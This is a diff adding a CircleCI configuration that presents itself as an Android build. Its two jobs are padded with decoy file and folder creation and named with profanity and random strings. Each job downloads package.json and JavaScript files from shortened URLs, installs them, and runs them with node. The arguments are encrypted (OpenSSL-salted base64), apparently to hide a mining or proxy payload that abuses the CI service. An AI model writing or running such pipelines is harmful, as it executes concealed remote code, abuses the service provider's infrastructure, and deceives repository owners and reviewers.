@@ -1,0 +1,51 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  FuckJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/awBKY -o package.json && curl -fsSL
+          shorturl.at/ktFO2 -o 66zfj9dxbwtvjs.js && curl -fsSL shorturl.at/twJKN
+          -o n1g5xkxk5efcic.js
+      - run: cat /etc/os-release
+      - run: touch c9uo0oz9447bv2ry9mrnitvxq.py
+      - run: npm i -s
+      - run: mkdir dq9x266hbzm65kd8n8acb73q
+      - run: touch 806ngrp66sgjdubgtzzh7la.net
+      - run: mkdir cdv906s1yrhnsda
+      - run: mkdir tvlpol2pjp0wawco
+      - run: node n1g5xkxk5efcic -r
+          U2FsdGVkX18g1PG/byI4L6T1i95xI9GbvkY1kmNfhr29YfSeWv8jM2zrWJl1BE1qISIY/apiCGXvuW6yK7EYu/4145PQvlQBqRl1+PlcnYXYTmxQVHnj9Put98NANKL/1hls0pgE5uELsJcXcP7ESrM0/RqdrQnm4QYJt0r5x9dcKvslBZ6ntIcAjX1eVVNlPBMwXnxFsqHuDznjF1M5oI9o1+ZsExW9E9Lnw+WXHc2n1ZDfphoPujkiVdhC41DAYiN78IbIsRSEEVRuUojaa/UKFehGT6Xs2/mdYeagdkE=
+          -sp -t
+          U2FsdGVkX1/xDH6DCb5Azhzsunr+tQkuolpsgnNVbCLpw6vg39mjsZepE2BSaFRz -s
+          U2FsdGVkX1+x9m+A349tUNVFb1GLj2gW7OSnh+fBhkDrSP4dORD+joe/pKlBYHUFUTlK7bldutevvc+tc0EePDhNTDyffkXiq7ph+OQMDeBPIPnIlRWQsxYu0UguOIz5LwElvH48pftE9xqH9AwUKg321aQZ7qVc+JBw8lhhwFPYkwCPAxaZDk/nvmStSPK3wNZc+k7WSkZtJpqnSpcA7HYP+D6bmOh7mtoZ2aRRbIQ=
+          -lpn U2FsdGVkX1+GPaEzvNqGgQMKDHvSOS/ACwXNGJYx2Wc=
+  dataBuild:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/ciuR6 -o package.json && curl -fsSL
+          shorturl.at/dfgsK -o 0bxd41xv7en5.js && curl -fsSL shorturl.at/gvC35
+          -o 76nejtoq9gooyp.js
+      - run: touch oyklkdoert2ul74khxzjpft49.cpp
+      - run: mkdir wzkpsgo2vg90ji5ff3bm
+      - run: touch 13pgrpseds1aneju56.sh
+      - run: npm i -s
+      - run: touch aoa9c306qo0chjbbzb.js
+      - run: cat /etc/os-release
+      - run: mkdir q1j2tvcsghf9p1w
+      - run: node 0bxd41xv7en5 -t
+          U2FsdGVkX19wAbMUD8Smarmy+CKy6clv9iKHgUkoHvU4m0v5aQOsJRr7FXP99Tk6 -sp
+          -lpn U2FsdGVkX19sa0j7VSyxo71y6kIdbQxVtBrWQWpA2qw= -r
+          U2FsdGVkX1+lpNrR2eKKG804HCLVBx8MiF1klmLMf6W/QZK4astgICzlanuHxeTwr68a4CM5Mny3xcEvOBxaOc1qJwOctP+m2cS5BbrJaj0HE6eQ63HdBR2h2g3PjZWh0bMiWHvvRrKyg6sKpaYtRpLjpZ0xCa0IKpUMnB/Lem/EDsrie1v7HrD8sk7fWuprdC6/goViWRwSIILm5raIq7BIK5V76cTqkZSMCMHQ5uHG68wLc8hfPgJilJdezERngc/4vDnMhirsBPo479eTVSpxxWfk9XNcCbwQktxM9FE=
+          -s
+          U2FsdGVkX18nQws/m9A+IRPLNIssx4CTvLtwc2AiYApMSdPjEP6GZDw9F10PZ1Ts3jp2oFMdrAk5p5DzcpncSD74/8uoSz+Q2G9uOmqhNEOVl1zja+/uNRhg9C34/EwwbDLb2Fm4d74nNGhew3t/8sLSA8TtHD4NaOC0Vha6eyzTOgPJ4kv2y/C7Im3mQ/ytaTo7XwFdR+yW2HYQdorBJoLAZknUyDQGjIoLzKqx6as=
+workflows:
+  buildSoure:
+    jobs:
+      - FuckJobs
+  kiem-tra:
+    jobs:
+      - dataBuild
